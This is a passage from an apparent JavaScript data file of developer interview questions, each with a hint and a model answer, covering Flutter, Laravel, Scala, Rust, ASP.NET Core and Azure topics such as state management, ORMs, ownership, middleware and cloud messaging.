      { q:'Explain the Flutter widget tree. What is the difference between StatelessWidget and StatefulWidget?', hint:'Everything is a widget. StatelessWidget: immutable, rebuilt when parent rebuilds. StatefulWidget: has State object that persists. setState() triggers rebuild. Prefer stateless when possible.', answer:`In Flutter, everything is a widget - layout, styling, interactions, and animations are all widgets composing a tree. StatelessWidget is immutable: its build method runs whenever the parent rebuilds, producing the same output for the same configuration. StatefulWidget has a companion State object that persists across rebuilds and can store mutable data. Calling setState(() { ... }) marks the state as dirty and schedules a rebuild. I keep widgets as small and stateless as possible - stateless widgets are easier to test, reason about, and optimise. Stateful widgets are appropriate when the widget needs to track its own UI state (animation, text field value, scroll position) rather than application state, which belongs in a state management solution.` },
      { q:'What state management solutions exist in Flutter? Compare Provider, BLoC, and Riverpod.', hint:'Provider: InheritedWidget wrapper, simple. BLoC: streams-based, strict separation, verbose. Riverpod: Provider evolved, compile-safe, no BuildContext dependency. Riverpod recommended for new projects.', answer:`Flutter has many state management options. Provider wraps InheritedWidget with a convenient API - context.watch<T>() rebuilds when the provider changes, context.read<T>() reads without subscribing. It is simple and well-understood. BLoC (Business Logic Component) uses streams: UI sends Events to a BLoC, which processes them and emits States via a Stream. BLoC enforces strict separation of UI and logic but is verbose. Riverpod is Provider's evolution - providers are declared at the top level (not in the widget tree), are compile-time safe, and can be read without BuildContext via a Ref. Riverpod's auto-dispose and family modifiers handle common patterns elegantly. I use Riverpod for new projects, Provider for existing codebases, and BLoC where strict separation is a team requirement.` },
      { q:'How does Flutter\'s rendering pipeline work?', hint:'Widget tree (configuration) -> Element tree (identity) -> RenderObject tree (layout/paint). Skia/Impeller renders directly to GPU. Three trees. Build, layout, paint phases.', answer:`Flutter has three trees. The Widget tree is a lightweight blueprint - widgets are immutable configuration objects. The Element tree is the instantiated, stateful representation that persists between rebuilds - it reconciles old and new widget trees (like React's reconciler), identifying which RenderObjects to update. The RenderObject tree performs the actual layout (measuring and positioning) and painting. Flutter bypasses native UI components entirely, drawing every pixel with Skia (or Impeller in newer versions) directly to a GPU surface. This gives Flutter pixel-perfect consistency across platforms but means it does not automatically inherit platform-native widget behaviours. The build phase creates/updates the widget tree, layout phase measures and positions, and paint phase draws to the canvas.` },
      { q:'How do you handle asynchronous operations in Flutter?', hint:'Future for one-time async. Stream for multiple events. FutureBuilder/StreamBuilder for UI. async/await in Dart. Isolates for CPU-heavy work. Error handling in FutureBuilder.', answer:`Dart uses async/await built on Futures (single value) and Streams (sequence of values). FutureBuilder and StreamBuilder connect async operations to the widget tree, rebuilding with the connection state (waiting, done, error) and data. For CPU-intensive work that would block the UI thread (image processing, JSON parsing), I use Isolates - Dart's version of separate threads with no shared memory, communicating via message passing. compute() is a convenience wrapper for spawning an isolate for a single function. Error handling in FutureBuilder: builder receives an AsyncSnapshot with hasError and error properties - I display appropriate error UI rather than letting the widget show nothing. Completer allows imperative control of Futures when needed.` },
      { q:'How do you test Flutter applications?', hint:'Unit tests: pure Dart, no Flutter. Widget tests: pumpWidget, find, tap, expect. Integration tests: full app on device/emulator. golden tests: pixel snapshots. flutter test command.', answer:`Flutter testing has three levels. Unit tests test Dart logic (models, services, state management) without Flutter framework - fast and numerous. Widget tests (flutter test) use pumpWidget() to render a widget in a test environment, find.byType()/find.text() to locate widgets, and tester.tap()/tester.enterText() to interact. They are much faster than running on a device. Integration tests run the full app on a real device or emulator with flutter drive - I use them for critical user journeys. Golden tests capture a widget's rendered output as a reference image and fail when the widget changes visually - useful for design system components. Mockito or mocktail mocks dependencies for unit and widget tests.` },
      { q:'How does Flutter handle platform-specific code?', hint:'Platform channels: MethodChannel for native calls (Swift/Kotlin/Java). Plugins wrap platform channels. dart:io for file/OS access. Conditional imports for platform-specific implementations.', answer:`Flutter communicates with native platform code through Platform Channels. A MethodChannel allows calling native Swift/Kotlin code from Dart and receiving results asynchronously. The Dart side calls channel.invokeMethod('getBatteryLevel') and awaits the result; the native side registers a handler and responds. Plugins package this pattern with cross-platform Dart APIs abstracting the native implementation. For standard functionality, the Flutter ecosystem has mature plugins for camera, sensors, notifications, and more. For custom native features, I create a plugin or use a federated plugin structure. dart:io provides file system and process access for desktop and mobile (not web). Conditional imports allow platform-specific implementations behind a shared interface.` },
      { q:'How do you optimise Flutter app performance?', hint:'Avoid unnecessary rebuilds (const constructors, splitting widgets). RepaintBoundary to isolate painting. Lazy loading (ListView.builder). Profile with DevTools. Reduce widget tree depth. Image caching.', answer:`Flutter performance starts with minimising unnecessary widget rebuilds. const constructors mark widgets whose configuration never changes - Flutter skips rebuilding them entirely. Splitting large widgets into smaller, focused widgets means state changes rebuild only the affected subtree. RepaintBoundary isolates subtrees from parent repaints - useful for independently animated elements. ListView.builder lazily creates items as they scroll into view instead of building the entire list upfront. The Flutter DevTools Performance view visualises frame rendering time, identifying jank (frames exceeding 16ms). The Memory view tracks allocations and detects leaks. For images, precacheImage pre-loads critical images and CachedNetworkImage handles disk caching. Expensive computations in build() should be moved to compute() or cached.` },
    ],
    laravel: [
      { q:"Explain Laravel's MVC structure and the request lifecycle.", hint:'Kernel receives request -> middleware stack -> router -> controller -> response. Service providers boot the framework. Facades provide static-like access to services. Eloquent is the M layer.', answer:`Laravel routes every HTTP request through bootstrap/app.php, which resolves the HTTP Kernel. The kernel runs global middleware (session, CSRF), then the router matches the request to a route definition and runs route-specific middleware. The controller (or route closure) handles business logic, interacts with Eloquent models (the data layer), and returns a response. Service providers register and boot all framework services (database, cache, queue) during bootstrap - this is where package integrations register their bindings. Facades provide convenient static-like access to services (Cache::get(), Auth::user()) via the service container.` },
      { q:'How does Eloquent ORM work? Explain relationships and query optimisation.', hint:'ActiveRecord pattern. Relationships: hasOne, hasMany, belongsTo, belongsToMany, hasManyThrough. Eager loading: with() to prevent N+1. Query scopes for reusable filters.', answer:`Eloquent uses the ActiveRecord pattern - models represent database tables and instances represent rows, with methods for CRUD operations and query building. Relationships are defined as methods returning relationship objects: hasMany, belongsTo, belongsToMany (with pivot table), and polymorphic relationships for flexible associations. The N+1 problem is solved with eager loading: User::with(['posts', 'posts.comments'])->get() loads all related data in three queries instead of N+1. Local query scopes ($query->scopeActive()) keep reusable query constraints in the model. I use select() to fetch only needed columns and chunk() or lazy() for large datasets.` },
      { q:"What is Laravel's authentication and authorisation system?", hint:'Laravel Breeze/Jetstream for scaffolding. Laravel Sanctum: SPA and mobile API tokens. Passport: full OAuth2. Gates and Policies for authorisation. @can in Blade templates.', answer:`Laravel provides first-party authentication scaffolding through Breeze (simple) and Jetstream (full-featured with team management). For API authentication, Sanctum issues lightweight tokens stored in a tokens table and handles SPA authentication using cookies - much simpler than a full OAuth server. Passport implements a full OAuth2 server for applications that need to issue tokens to third-party clients. Authorisation uses Gates (closure-based, for simple checks) and Policies (class-based, one policy per model) - Policy methods like update(User $user, Post $post) encapsulate ownership logic. @can('update', $post) in Blade templates conditionally renders UI elements.` },
      { q:'How do Laravel queues and jobs work? When do you use them?', hint:'Job class: handle() method. Queue drivers: Redis, database, SQS. dispatch() adds to queue. Worker processes queue. Horizon for Redis queues. Failed jobs table. Retry logic.', answer:`Queues defer time-consuming tasks - sending emails, processing images, calling external APIs - to background workers so HTTP responses stay fast. I create Job classes with a handle() method containing the deferred work, and dispatch them with ProcessOrder::dispatch($order). Queue drivers (Redis for production, database for development, SQS for AWS workloads) store job payloads. php artisan queue:work starts workers that pull and process jobs. Laravel Horizon provides a real-time dashboard for monitoring Redis queues. Failed jobs are stored in the failed_jobs table and retried or inspected. I configure job timeouts, max attempts, and delay on a per-job basis.` },
      { q:'What is the Laravel service container and how does dependency injection work?', hint:'Service container: IoC container resolves class dependencies automatically. Type-hint in constructor: container injects. bind/singleton in service providers. Interfaces bound to implementations.', answer:`Laravel's service container automatically resolves class dependencies by inspecting type-hints in constructors. When a controller requests OrderService as a constructor parameter, the container creates it and injects it. Service providers bind interfaces to concrete implementations: $this->app->singleton(PaymentGateway::class, StripeGateway::class) means the container injects StripeGateway everywhere PaymentGateway is type-hinted. This makes swapping implementations trivial - change the binding, nothing else changes. I use interface-based injection for external services so I can swap implementations in tests with mock objects without changing the consuming code.` },
      { q:'How do you write tests in Laravel?', hint:'PHPUnit: php artisan test. Feature tests: full HTTP request via $this->get/post. Unit tests: isolated logic. RefreshDatabase trait: migrations per test. Factories for test data. Mocking: Mail::fake(), Queue::fake().', answer:`Laravel's testing layer wraps PHPUnit with convenient helpers. Feature tests use $this->getJson('/api/users') to make HTTP requests against the actual application and assert on response JSON, status codes, and database state. Unit tests test individual classes in isolation with Mockery or PHPUnit mocks. The RefreshDatabase trait runs migrations fresh for each test, and DatabaseTransactions wraps each test in a rolled-back transaction for speed. Model factories (UserFactory with faker) generate realistic test data declaratively. Laravel's test fakes (Mail::fake(), Queue::fake(), Storage::fake()) intercept real calls to side-effect services and provide assertion methods.` },
      { q:'How do you optimise a Laravel application for high traffic?', hint:'Eager loading. Query caching (Cache::remember). Route caching, config caching (php artisan optimize). Horizon for queues. Read replicas. OPcache. Response caching. CDN for assets.', answer:`Performance optimisation in Laravel works at multiple levels. At the database level, eager loading eliminates N+1 queries and query caching with Cache::remember wraps expensive queries. PHP-level: php artisan config:cache, route:cache, and view:cache compile configuration, routes, and Blade templates to single files, eliminating file I/O on each request. OPcache in production caches compiled PHP bytecode. At the application level, I offload slow work to queues (Horizon), use Redis for session and cache storage, and serve static assets via CDN. For read-heavy applications, I configure a MySQL read replica and use $model->onWriteConnection() only for write operations.` },
    ],
    scala: [
      { q:'What makes Scala different from Java, and why would you choose it for a project?', hint:'Hybrid OOP+FP. Immutable by default. Type inference. Pattern matching. Case classes. Traits vs interfaces. Akka, Spark ecosystem.', answer:`Scala runs on the JVM and interoperates with Java but adds a powerful type system, first-class functions, and immutable-by-default collections. Case classes give you value objects with equals, hashCode, and copy for free. Pattern matching is exhaustive and works on case class hierarchies, making state machines and AST processing clean. Traits support mixin composition with actual implementations, unlike Java interfaces until Java 8. The type system with higher-kinded types enables abstractions like Functor and Monad through Cats/Scalaz. I choose Scala for data pipelines (Spark is written in Scala), distributed systems (Akka), or domain-heavy applications where algebraic data types model the domain precisely.` },
      { q:'Explain Scala case classes, sealed traits, and how they model algebraic data types.', hint:'Sealed trait = sum type (either A or B). Case class = product type. Pattern match exhaustively. Compiler warns on missing cases. Option, Either, List are ADTs.', answer:`Sealed traits restrict subclasses to the same file, so the compiler knows all possible subtypes and warns when a match expression is non-exhaustive. Combining sealed trait with case classes creates algebraic data types: sealed trait Shape; case class Circle(radius: Double) extends Shape; case class Rectangle(w: Double, h: Double) extends Shape. Pattern matching on Shape is then exhaustive-checked. Option[A] is a sealed trait with Some(value) and None - a sum type that encodes nullability in the type system. Either[L, R] encodes success/failure. This approach makes illegal states unrepresentable and eliminates null checks.` },
      { q:'How does Scala handle concurrency? Compare Futures, Akka actors, and Cats Effect/ZIO.', hint:'Future: eager, ExecutionContext, side-effecting. Akka actors: message-passing, no shared state. Cats Effect IO / ZIO: purely functional, lazy, structured concurrency, resource safety.', answer:`Scala Futures are the basic async primitive - they start immediately on an ExecutionContext, compose with map/flatMap, and are familiar but eager (side effects run at creation). Akka Actors model concurrent systems as isolated stateful actors communicating only via messages, eliminating shared mutable state and enabling location transparency for distributed systems. Cats Effect IO and ZIO represent effects as lazy data structures - IO[A] describes a computation but runs nothing until unsafeRunSync. This enables structured concurrency (child fibers auto-cancel on parent failure), composable resource management with Resource, and deterministic testing. For modern Scala, I prefer ZIO or Cats Effect for their superior error handling and testability.` },
      { q:'What is implicit resolution in Scala, and how do typeclasses work?', hint:'implicit vals/defs/parameters. Typeclass pattern: trait + companion object implicit instances + syntax via implicit class. Scala 3 uses given/using. Context bounds.', answer:`Implicits are Scala mechanism for passing arguments automatically when the compiler can find a unique implicit in scope. The typeclass pattern uses this: define trait Show[A] { def show(a: A): String }, provide implicit instances in companion objects (implicit val intShow: Show[Int] = i => i.toString), and define a generic function with an implicit parameter def print[A](a: A)(implicit s: Show[A]). Context bounds sugar this to def print[A: Show](a: A). Implicit classes add methods to existing types for syntax enrichment. Scala 3 replaces implicits with clearer given/using keywords and derives for automatic derivation. Typeclasses enable ad-hoc polymorphism - adding behaviour to existing types without modifying them.` },
      { q:'How does Scala integrate with Apache Spark? What are common performance pitfalls?', hint:'RDD vs DataFrame vs Dataset. Lazy evaluation, DAG. Shuffles are expensive. Avoid UDFs where possible. Broadcast joins. Data skew. Caching strategy.', answer:`Spark is written in Scala and its native API is Scala. DataFrames and Datasets provide a typed, optimised layer over RDDs - the Catalyst optimizer rewrites DataFrame queries into efficient execution plans. Common pitfalls: wide transformations like groupByKey and join trigger shuffles (data movement across nodes), which are the dominant performance cost - repartition before joining on skewed keys. UDFs bypass Catalyst and should be replaced with built-in functions when possible. Broadcast joins (spark.sql.autoBroadcastJoinThreshold) avoid shuffles for small-large table joins. I cache (persist) DataFrames that are reused in multiple actions and unpersist them when done. Monitoring the Spark UI DAG reveals stages, tasks, and skew.` },
      { q:'What are higher-order functions and how are they used in Scala collections?', hint:'map, flatMap, filter, foldLeft, reduce, groupBy, zip. Function composition: andThen, compose. Partial functions. Currying and partial application.', answer:`Higher-order functions take functions as parameters or return functions. Scala collections have a rich HOF API: map transforms each element, flatMap transforms and flattens (enabling for-comprehensions as syntactic sugar for chained flatMaps), filter selects elements, foldLeft reduces left-to-right with an accumulator, groupBy creates a Map of collections. For-comprehensions desugar to flatMap/map/withFilter, making sequential async or optional operations readable. Function composition: (f andThen g)(x) == g(f(x)). Partial application with curried functions: def add(x: Int)(y: Int) = x + y; val add5 = add(5) creates a new function. Partial functions (PartialFunction[A, B]) are defined only for a subset of inputs and compose with orElse.` },
      { q:'How do you handle errors functionally in Scala using Either, Try, and Option?', hint:'Option: presence/absence. Try: exception-safe computation. Either[L, R]: typed error channel. For-comprehensions chain them. Cats Validated for accumulating errors.', answer:`Option[A] handles null-safety - Some(value) or None - and composes with map/flatMap/getOrElse. Try[A] wraps computations that may throw exceptions: Try(Integer.parseInt(s)) returns Success(n) or Failure(e) without try/catch blocks. Either[L, R] is the idiomatic typed error channel - Left carries the error type (often a sealed trait of domain errors), Right carries the success value. Right-biased map/flatMap on Either short-circuits on Left, making for-comprehensions natural: for { user <- findUser(id); order <- findOrder(user) } yield order. For accumulating multiple validation errors simultaneously, Cats Validated[E, A] collects all errors rather than stopping at the first, ideal for form validation.` },
    ],
    rust: [
      { q:'What is ownership in Rust and how does the borrow checker enforce memory safety?', hint:'Each value has one owner. Drop when owner goes out of scope. Move vs copy. Borrow: &T (shared) and &mut T (exclusive). Lifetime annotations for references outliving scope.', answer:`Rust memory safety is enforced at compile time through ownership rules: every value has exactly one owner, and the value is dropped (freed) when the owner goes out of scope - no garbage collector needed. Assignment moves ownership for heap-allocated types (let b = a; now a is invalid). Copying is only for types implementing Copy (primitives, tuples of Copy types). Borrowing creates references: &T allows multiple simultaneous shared (read-only) references; &mut T allows exactly one exclusive mutable reference with no other references active. The borrow checker enforces these rules statically, preventing dangling pointers, use-after-free, and data races. Lifetimes annotate how long references must remain valid, preventing references outliving the data they point to.` },
      { q:'Explain Rust traits. How do they differ from interfaces in Java/C#?', hint:'Traits: shared behaviour. impl Trait for Type. Default methods. Trait objects: dyn Trait (dynamic dispatch, fat pointer). Generics with trait bounds: T: Display. Blanket implementations.', answer:`Traits define shared behaviour through method signatures and optional default implementations, similar to Java interfaces. But Rust traits have key differences: they support blanket implementations (impl<T: Display> MyTrait for T implements MyTrait for any type that implements Display), enabling powerful abstractions without inheritance. Trait objects (Box<dyn Trait> or &dyn Trait) enable runtime polymorphism through a fat pointer (data pointer + vtable pointer) - analogous to Java interfaces but explicit about the indirection cost. Generic type bounds (fn print<T: Display>(val: T)) use static dispatch with monomorphization - the compiler generates a concrete function per type. I choose generics for performance-critical code and trait objects when I need a heterogeneous collection or dynamic behaviour selection.` },
      { q:'How does Rust handle concurrency, and what guarantees does it provide?', hint:'Ownership rules prevent data races at compile time. Send: safe to transfer across threads. Sync: safe to share reference across threads. Arc<Mutex<T>>. Channels: mpsc. Rayon for data parallelism. Tokio/async-await for I/O.', answer:`Rust compile-time ownership rules make data races impossible: a value can only be mutated through one path at a time. The Send trait marks types safe to transfer to another thread (most types); Sync marks types safe to share a reference across threads. Arc<T> (atomic reference counting) enables shared ownership across threads; Arc<Mutex<T>> adds interior mutability for safe concurrent mutation. Channels (std::sync::mpsc) provide message-passing concurrency. For async I/O, Rust has async/await syntax with runtimes like Tokio - Futures are state machines compiled to zero-cost abstractions without a runtime overhead. Rayon provides data-parallelism for CPU-bound work via .par_iter(). Unlike Go or Java, Rust data races are caught by the compiler, not at runtime.` },
      { q:'What are lifetimes in Rust, and when do you need to annotate them explicitly?', hint:"Lifetime elision handles most cases. Explicit when: function returning reference, struct holding reference, multiple input references. 'static lifetime. Lifetime bounds on traits.", answer:`Lifetime annotations describe how long references must remain valid relative to each other - they prevent use-after-free by ensuring a reference never outlives the data it points to. Lifetime elision rules handle the common cases automatically. Explicit annotations are needed when a function takes multiple reference parameters and returns a reference, and the compiler cannot infer which input the output lifetime depends on: fn longest<'a>(x: &'a str, y: &'a str) -> &'a str tells the compiler the returned reference lives as long as the shorter of x and y. Structs holding references need lifetime parameters: struct Important<'a> { content: &'a str }. The 'static lifetime means the reference is valid for the entire program (string literals are 'static). I try to design around owned types first and use lifetimes only when performance requires avoiding clones.` },
      { q:'Explain the Result and Option types and idiomatic error handling in Rust.', hint:'Option<T>: Some/None. Result<T, E>: Ok/T, Err/E. ? operator propagates errors. From/Into for error conversion. thiserror/anyhow crates. Custom error enums.', answer:`Option<T> models nullable values without null pointers - Some(value) or None - with map, and_then, unwrap_or, and pattern matching. Result<T, E> models fallible operations - Ok(value) or Err(error) - eliminating unchecked exceptions. The ? operator is the key ergonomic feature: fn read_config() -> Result<Config, MyError> { let text = fs::read_to_string("config.toml")?; ... } - ? unwraps Ok or returns Err early, with automatic From conversion between error types. I define domain-specific error enums (often with thiserror's derive macro) for library code, providing precise error types. For application code, anyhow::Error provides a convenient boxed error with context: context("failed to read config")?. I avoid unwrap/expect in production code except for logically impossible cases.` },
      { q:'What is zero-cost abstraction in Rust? Give examples.', hint:'Iterators compile to loop equivalents. Generics monomorphize. Async state machines. No runtime overhead for abstractions compared to hand-written C code.', answer:`Zero-cost abstractions mean high-level Rust code compiles to the same machine code as hand-written low-level code - you do not pay for abstraction at runtime. Iterator chains: (0..1000).filter(|x| x % 2 == 0).map(|x| x * x).sum() compiles to a tight loop without allocating intermediate vectors - the compiler inlines the closures and eliminates bounds checks. Generic functions are monomorphized: fn largest<T: PartialOrd>(list: &[T]) generates a concrete function per type, enabling type-specific optimisations. Async functions are compiled to state machines with no runtime overhead beyond what the actual async work requires. Traits with static dispatch add no indirection. This is why Rust is used in embedded systems, OS kernels, and game engines - you can write expressive code that competes with hand-optimised C.` },
      { q:'How would you structure a production Rust web service? What crates would you use?', hint:'Tokio runtime. Axum or Actix-web for HTTP. SQLx for async DB. Serde for JSON. Tower middleware. tracing for observability. cargo workspaces for multi-crate.', answer:`For a production Rust API, I use Tokio as the async runtime. Axum (from the Tokio team) or Actix-web for HTTP routing - Axum uses Tower middleware natively, enabling composable middleware for authentication, tracing, and rate limiting. Serde with serde_json for JSON serialisation/deserialisation - derive macros on structs make this zero-boilerplate. SQLx for async database access with compile-time query checking against a real database. tracing crate for structured logging with tracing-subscriber formatting to JSON for log aggregation. thiserror for error types, anyhow for application error handling. I structure the project as a Cargo workspace with separate crates for domain logic (pure Rust, no I/O), infrastructure (database, HTTP), and the binary (wiring). This keeps core logic testable without running a server.` },
    ],
    'asp.net': [
      { q:'Explain the ASP.NET Core middleware pipeline and how you build custom middleware.', hint:'IApplicationBuilder.Use/Run/Map. Pipeline: each middleware calls next() or short-circuits. Order matters (auth before endpoint routing). IMiddleware interface or convention-based. app.UseAuthentication() before app.UseAuthorization().', answer:`ASP.NET Core processes requests through an ordered middleware pipeline. Each piece of middleware receives the HttpContext, does pre-processing, optionally calls the next middleware, then does post-processing on the way back. app.Use adds middleware that calls next; app.Run adds terminal middleware. Order is critical - authentication must run before authorisation, and CORS must run early. Custom middleware is a class with InvokeAsync(HttpContext context, RequestDelegate next) - inject dependencies through the constructor (singleton lifetime) or as InvokeAsync parameters (scoped/transient). I use middleware for cross-cutting concerns: request logging, correlation ID injection, global exception handling, and API key validation.` },
      { q:'How does dependency injection work in ASP.NET Core? Explain service lifetimes.', hint:'IServiceCollection.AddTransient/Scoped/Singleton. Constructor injection. Transient: new instance per injection. Scoped: one per HTTP request. Singleton: one for app lifetime. Captive dependency: scoped in singleton is a bug.', answer:`ASP.NET Core has a built-in IoC container. Services are registered in Program.cs: builder.Services.AddScoped<IUserService, UserService>(). Constructor injection resolves dependencies automatically. Transient creates a new instance every time - for lightweight, stateless services. Scoped creates one instance per HTTP request, shared within that request - ideal for DbContext (EF Core registers it as scoped by default). Singleton creates one instance for the application lifetime - for thread-safe, stateless services like configuration helpers. The captive dependency problem: injecting a scoped service into a singleton captures the first request's instance permanently, causing bugs and potential data leaks. The container detects this and throws in development mode.` },
      { q:'What is Entity Framework Core and how do you optimise database access with it?', hint:'Code-first migrations. DbContext. LINQ to SQL. Eager loading (Include). Explicit loading vs lazy loading. AsNoTracking for read-only queries. Raw SQL for complex queries. Compiled queries.', answer:`EF Core is an ORM that maps C# classes to database tables and translates LINQ queries to SQL. Code-first approach: define entity classes and DbContext with DbSet properties, then generate migrations with dotnet ef migrations add. Common optimisations: use AsNoTracking() for read-only queries - tracking is expensive as EF Core takes a snapshot for change detection. Eager loading with Include/ThenInclude loads related entities in one query, preventing N+1 problems. For complex queries, I use raw SQL with FromSqlRaw and always parameterise to prevent injection. Compiled queries (EF.CompileQuery) cache the LINQ-to-SQL translation overhead for frequently executed queries. I always check the actual SQL with logging or a profiler - EF Core can produce cartesian explosion with multiple Include paths on collections.` },
      { q:'How does authentication and authorisation work in ASP.NET Core with JWT?', hint:'AddAuthentication/AddJwtBearer. ClaimsPrincipal. [Authorize] attribute. Policy-based: RequireRole, RequireClaim, custom IAuthorizationRequirement. Middleware order: UseAuthentication before UseAuthorization.', answer:`JWT authentication in ASP.NET Core: builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer() with TokenValidationParameters configuring the signing key, issuer, and audience. app.UseAuthentication() reads and validates the JWT from the Authorization header, populating HttpContext.User as a ClaimsPrincipal. app.UseAuthorization() checks policy requirements. [Authorize] on controllers/actions requires authenticated users. Policy-based authorisation is more flexible than role-based: builder.Services.AddAuthorization(opt => opt.AddPolicy("AdminOnly", p => p.RequireRole("Admin"))) and [Authorize(Policy = "AdminOnly")]. Custom requirements implement IAuthorizationRequirement and IAuthorizationHandler for domain-specific checks like resource ownership.` },
      { q:'What is the difference between .NET Framework and .NET Core/.NET 5+?', hint:'.NET Framework: Windows-only, not open source. .NET Core: cross-platform, open source, modular. .NET 5+ unified platform. Side-by-side installs. Performance improvements in each release. Kestrel vs IIS.', answer:`.NET Framework is Windows-only, ships with the OS, and is in maintenance mode. .NET Core (now .NET 5, 6, 7, 8...) is cross-platform (Windows, Linux, macOS), open source, and significantly faster - especially for web workloads. .NET 8 benchmarks show ASP.NET Core among the fastest web frameworks in TechEmpower. The Kestrel web server runs cross-platform and can be deployed without IIS. Migration from .NET Framework is not always trivial - Windows-specific APIs (WCF, WebForms, Registry) need alternatives. .NET Standard was the compatibility layer; it is being phased out as .NET 5+ unified the platform. New projects should always use .NET 8 LTS.` },
      { q:'How do you implement caching in ASP.NET Core?', hint:'IMemoryCache: in-process. IDistributedCache: Redis/SQL Server, multi-instance. Response caching middleware. Output caching (.NET 7+). Cache-aside pattern. Cache invalidation strategies.', answer:`ASP.NET Core has three caching layers. IMemoryCache stores data in-process - fast but lost on restart and not shared across multiple instances. IDistributedCache with a Redis backing store works across load-balanced instances; AddStackExchangeRedisCache registers it. Response caching middleware caches full HTTP responses based on Cache-Control headers. Output caching (.NET 7+) is more flexible with policy-based invalidation by tags. For the cache-aside pattern: check cache first, on miss load from database and store with an expiry. Cache invalidation is the hard part - I use short expiry times for frequently changed data and tag-based invalidation where available. I always cache at the right layer - database query results, computed aggregations, or full responses - depending on where the bottleneck is.` },
      { q:'How do you structure a large ASP.NET Core API for maintainability?', hint:'Clean Architecture / Vertical Slice. Domain, Application, Infrastructure, Presentation layers. MediatR for CQRS. FluentValidation. Repository pattern or direct EF Core in handlers. Global exception handling. OpenAPI/Swagger.', answer:`For large APIs I use Clean Architecture: Domain (entities, value objects, domain events - no dependencies), Application (use cases as MediatR command/query handlers, interfaces for infrastructure), Infrastructure (EF Core implementations, external APIs, email), and WebAPI (controllers that dispatch MediatR commands). MediatR decouples controllers from business logic - controllers map HTTP to commands and return HTTP responses, handlers contain all logic. FluentValidation validates commands with a MediatR pipeline behaviour that runs before handlers. Controllers stay thin - one line per action calling mediator.Send(command). Global exception handling via middleware converts domain exceptions to appropriate HTTP status codes. This structure makes each feature a vertical slice of files - easy to find and test.` },
    ],
    azure: [
      { q:'How does Azure Active Directory (Entra ID) work and how do you integrate it into an application?', hint:'OAuth2/OIDC flows. App registration: client ID, tenant ID, redirect URI. Scopes and permissions: delegated vs application. MSAL library. Managed Identities for service-to-service. Conditional Access policies.', answer:`Azure AD (now Microsoft Entra ID) is Microsoft cloud identity platform implementing OAuth2 and OIDC. To integrate, I register the application in Azure Portal to get client ID and tenant ID. For web apps, the authorization code flow redirects users to Microsoft login, receives an authorization code, exchanges it for tokens. MSAL (Microsoft Authentication Library) handles this complexity. Delegated permissions act on behalf of the signed-in user; application permissions allow service-to-service calls without a user. Managed Identities eliminate credential management for Azure services - an App Service can obtain tokens for Key Vault or SQL Database automatically without storing secrets. Conditional Access policies enforce MFA, device compliance, and location restrictions at the identity layer, not in application code.` },
      { q:'Explain Azure Service Bus vs Azure Event Grid vs Azure Event Hubs. When do you use each?', hint:'Service Bus: enterprise messaging, guaranteed delivery, FIFO, dead-letter queue, sessions. Event Grid: event routing, pub/sub, webhooks, lightweight. Event Hubs: high-throughput telemetry ingestion, Kafka-compatible, consumer groups.', answer:`Service Bus is an enterprise message broker for decoupling services - guaranteed delivery, FIFO ordering with sessions, dead-lettering for poison messages, and message lock to prevent duplicate processing. Use it for order processing, payment flows, or any workflow where every message must be processed exactly once. Event Grid is a serverless event routing service for lightweight pub/sub - publish events (blob created, resource group change) and route to multiple subscribers (Logic Apps, Functions, webhooks). Use it for event-driven automation and fan-out notification. Event Hubs is a high-throughput event streaming platform ingesting millions of events per second - it retains events for up to 90 days, consumer groups allow independent readers, and it is Kafka-compatible. Use it for telemetry, clickstreams, and IoT data pipelines feeding into analytics.` },
      { q:'What is Azure Kubernetes Service (AKS) and how does it differ from running Kubernetes yourself?', hint:'Managed control plane: Microsoft manages API server, etcd. You manage node pools. Node auto-provisioner/KEDA. Integrated: ACR, Azure AD, Azure Monitor, Azure CNI. Upgrade management. Cost: pay for nodes, not control plane.', answer:`AKS is a managed Kubernetes service where Microsoft operates the control plane (API server, scheduler, etcd) at no charge - you pay only for agent nodes. This eliminates the operational burden of upgrading and patching control plane components. AKS integrates natively with Azure services: Azure Container Registry for image pulls, Azure AD for RBAC (workload identity replaces pod-level service accounts), Azure Monitor and Container Insights for observability, and Azure CNI for pod networking with VNet-native IP addresses. Node pools can use Spot VMs for cost savings on fault-tolerant workloads. KEDA enables event-driven autoscaling triggered by Service Bus queue depth, Event Hub lag, or custom metrics. Compared to self-managed Kubernetes, AKS trades some flexibility for significant operational savings, especially in control plane management and cloud integration.` },
      { q:'How do you implement zero-downtime deployments on Azure?', hint:'Azure App Service deployment slots (swap). AKS rolling updates. Azure Traffic Manager / Front Door for canary. Blue/green with load balancer rules. Health probes. Application Insights for rollback signals.', answer:`Zero-downtime deployment strategies on Azure depend on the hosting platform. Azure App Service deployment slots allow deploying to a staging slot (separate cold-start, environment variables can be slotted or sticky), running smoke tests, then performing a slot swap - traffic shifts in seconds and the old slot becomes the new staging slot for instant rollback. AKS rolling updates replace pods gradually with configurable maxSurge and maxUnavailable, with readiness probes gating traffic. For canary deployments at the DNS/routing level, Azure Front Door or Traffic Manager can split traffic by percentage between two backends. Application Insights monitors error rates and latency during rollout - if metrics degrade, I trigger an automated rollback via a release gate in Azure DevOps.` },
      { q:'How does Azure cost optimisation work? What strategies do you apply?', hint:'Reserved Instances vs Spot VMs vs Pay-as-you-go. Right-sizing. Azure Advisor recommendations. Auto-shutdown for dev environments. Storage tiering. Tagging for cost allocation. Azure Cost Management budgets and alerts.', answer:`Cost optimisation on Azure starts with visibility - tagging all resources with environment and team tags, then using Azure Cost Management to analyse spend by tag and set budget alerts. Reserved Instances provide up to 72% savings over pay-as-you-go for predictable workloads (1 or 3 year commitments). Spot VMs for fault-tolerant batch workloads (AKS Spot node pools, Batch) can save 90%. Dev/test environments use auto-shutdown schedules and smaller SKUs. Azure Advisor continuously recommends right-sizing underutilised VMs. Storage cost optimisation uses lifecycle management policies to move cold blobs to Cool or Archive tiers automatically. For databases, Serverless Azure SQL scales compute to zero when idle, eliminating costs for development databases. I review the Azure Advisor recommendations weekly as part of operational hygiene.` },
